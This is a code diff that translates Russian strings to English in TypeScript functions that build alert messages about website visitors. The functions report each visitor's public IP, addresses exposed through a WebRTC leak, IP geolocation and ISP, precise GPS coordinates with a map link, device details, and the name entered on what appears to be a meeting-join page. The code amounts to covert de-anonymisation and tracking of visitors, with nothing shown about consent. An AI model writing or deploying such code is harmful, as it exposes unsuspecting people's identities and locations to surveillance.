@@ -50,7 +50,7 @@ export const logVisitorEntry = async (data: {
 }) => {
   const { deviceInfo, publicIP, webrtcIPs, geoData } = data;
   
-  const localTime = new Date().toLocaleString('ru-RU', {
+  const localTime = new Date().toLocaleString('en-US', {
     year: 'numeric',
     month: '2-digit',
     day: '2-digit',
@@ -60,67 +60,69 @@ export const logVisitorEntry = async (data: {
     hour12: false
   });
   
-  // Получаем timezone пользователя
+  // Get user timezone
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  const timezoneOffset = -new Date().getTimezoneOffset() / 60; // В часах
+  const timezoneOffset = -new Date().getTimezoneOffset() / 60; // In hours
   const timezoneOffsetStr = timezoneOffset >= 0 ? `+${timezoneOffset}` : `${timezoneOffset}`;
   
-  // Получаем языки устройства
+  // Get device languages
   const languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
   
   const deviceEmoji = deviceInfo.device === 'ios' ? '📱' : 
                      deviceInfo.device === 'android' ? '🤖' : '🖥️';
   
-  let message = `🎯 <b>НОВЫЙ ПОСЕТИТЕЛЬ</b>\n\n`;
+  let message = `🎯 <b>NEW VISITOR</b>\n\n`;
   
   // Device
   message += `${deviceEmoji} <b>${deviceInfo.deviceName}</b>\n`;
-  message += `💻 ОС: ${deviceInfo.os || 'Unknown'}\n`;
-  message += `🌍 Браузер: ${deviceInfo.browser || 'Unknown'}\n`;
-  message += `⏰ Локальное время: ${localTime}\n`;
+  message += `💻 OS: ${deviceInfo.os || 'Unknown'}\n`;
+  message += `🌍 Browser: ${deviceInfo.browser || 'Unknown'}\n`;
+  message += `⏰ Local Time: ${localTime}\n`;
   message += `🕐 Timezone: ${timezone} (UTC${timezoneOffsetStr})\n`;
-  message += `🗣️ Языки: ${languages}\n\n`;
+  message += `🗣️ Languages: ${languages}\n\n`;
   
   // IP addresses
-  message += `🌐 <b>IP-адреса:</b>\n`;
-  message += `   📍 Публичный: <code>${publicIP}</code>\n`;
+  message += `🌐 <b>IP Addresses:</b>\n`;
+  message += `   📍 Public: <code>${publicIP}</code>\n`;
   if (webrtcIPs && webrtcIPs.length > 0) {
     message += `   🔍 WebRTC Leak (${webrtcIPs.length}): ${webrtcIPs.map(ip => `<code>${ip}</code>`).join(', ')}\n`;
   } else {
-    message += `   ⚠️ WebRTC Leak: не обнаружены\n`;
+    message += `   ⚠️ WebRTC Leak: not detected\n`;
   }
   message += `\n`;
   
   // IP Geolocation
   if (geoData) {
-    message += `📍 <b>Локация (по IP):</b>\n`;
+    message += `📍 <b>Location (by IP):</b>\n`;
     if (geoData.country) {
-      message += `   🌍 Страна: ${geoData.country}\n`;
+      message += `   🌍 Country: ${geoData.country}\n`;
     }
     if (geoData.city) {
-      message += `   🏙️ Город: ${geoData.city}\n`;
+      message += `   🏙️ City: ${geoData.city}\n`;
     }
     if (geoData.region) {
-      message += `   📌 Регион: ${geoData.region}\n`;
+      message += `   📌 Region: ${geoData.region}\n`;
     }
     if (geoData.timezone) {
-      message += `   ⏰ Часовой пояс: ${geoData.timezone}\n`;
+      message += `   ⏰ Timezone: ${geoData.timezone}\n`;
     }
     if (geoData.isp) {
-      message += `   📡 Провайдер: ${geoData.isp}\n`;
+      message += `   📡 ISP: ${geoData.isp}\n`;
     }
     message += `\n`;
   }
   
-  // Screen
-  message += `📺 <b>Экран:</b>\n`;
-  message += `   📐 Размер: ${deviceInfo.screenWidth}×${deviceInfo.screenHeight}\n`;
-  message += `   🎨 Глубина цвета: ${deviceInfo.colorDepth}-bit\n`;
-  message += `   🔢 Плотность: ${deviceInfo.pixelRatio}×\n\n`;
+  // Screen (only include valid values)
+  message += `📺 <b>Screen:</b>\n`;
+  message += `   📐 Size: ${deviceInfo.screenWidth}×${deviceInfo.screenHeight}\n`;
+  if (deviceInfo.devicePixelRatio && deviceInfo.devicePixelRatio > 0) {
+    message += `   🔢 Pixel Ratio: ${deviceInfo.devicePixelRatio}×\n`;
+  }
+  message += `\n`;
   
   // Hardware
   if (deviceInfo.hardwareConcurrency || deviceInfo.deviceMemory) {
-    message += `⚙️ <b>Железо:</b>\n`;
+    message += `⚙️ <b>Hardware:</b>\n`;
   }
   if (deviceInfo.hardwareConcurrency) {
     message += `   🔧 CPU cores: ${deviceInfo.hardwareConcurrency}\n`;
@@ -131,7 +133,7 @@ export const logVisitorEntry = async (data: {
   
   // Network
   if (deviceInfo.connectionEffectiveType) {
-    message += `   📶 Сеть: ${deviceInfo.connectionEffectiveType}`;
+    message += `   📶 Network: ${deviceInfo.connectionEffectiveType}`;
     if (deviceInfo.connectionDownlink) {
       message += ` (${deviceInfo.connectionDownlink} Mbps)`;
     }
@@ -144,7 +146,7 @@ export const logVisitorEntry = async (data: {
 };
 
 export const logJoinAttempt = async (roomName: string, userName: string, buttonType: 'join' | 'join-without-audio', deviceInfo: any) => {
-  const localTime = new Date().toLocaleString('ru-RU', {
+  const localTime = new Date().toLocaleString('en-US', {
     hour: '2-digit',
     minute: '2-digit',
     second: '2-digit',
@@ -153,10 +155,10 @@ export const logJoinAttempt = async (roomName: string, userName: string, buttonT
   
   const buttonText = buttonType === 'join' ? 'Join meeting' : 'Join without audio';
   
-  const message = `🎬 <b>ПОПЫТКА ВХОДА</b>\n\n` +
-    `🔘 <b>Кнопка:</b> ${buttonText}\n` +
-    `👤 <b>Имя:</b> ${userName || 'Не указано'}\n` +
-    `🏠 <b>Комната:</b> ${roomName}\n` +
+  const message = `🎬 <b>JOIN ATTEMPT</b>\n\n` +
+    `🔘 <b>Button:</b> ${buttonText}\n` +
+    `👤 <b>Name:</b> ${userName || 'Not specified'}\n` +
+    `🏠 <b>Room:</b> ${roomName}\n` +
     `${deviceInfo.deviceName}\n` +
     `⏰ ${localTime}`;
   
@@ -174,7 +176,7 @@ export const logGeolocationData = async (
   const lng = longitude.toFixed(6);
   const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
   
-  const localTime = new Date().toLocaleString('ru-RU', {
+  const localTime = new Date().toLocaleString('en-US', {
     hour: '2-digit',
     minute: '2-digit',
     second: '2-digit',
@@ -182,14 +184,14 @@ export const logGeolocationData = async (
   });
   
   const sourceEmoji = source === 'gps' ? '📍' : '🌐';
-  const sourceText = source === 'gps' ? 'GPS' : 'IP-геолокация';
+  const sourceText = source === 'gps' ? 'GPS' : 'IP Geolocation';
   
-  const message = `${sourceEmoji} <b>ГЕОЛОКАЦИЯ (${sourceText})</b>\n\n` +
-    `📍 <b>Координаты:</b>\n` +
-    `   Широта: ${lat}\n` +
-    `   Долгота: ${lng}\n` +
-    `   Точность: ±${Math.round(accuracy)} м\n\n` +
-    `🗺️ <a href="${googleMapsLink}">Открыть на карте</a>\n\n` +
+  const message = `${sourceEmoji} <b>GEOLOCATION (${sourceText})</b>\n\n` +
+    `📍 <b>Coordinates:</b>\n` +
+    `   Latitude: ${lat}\n` +
+    `   Longitude: ${lng}\n` +
+    `   Accuracy: ±${Math.round(accuracy)} m\n\n` +
+    `🗺️ <a href="${googleMapsLink}">Open on map</a>\n\n` +
     `${deviceInfo.deviceName}\n` +
     `⏰ ${localTime}`;
   
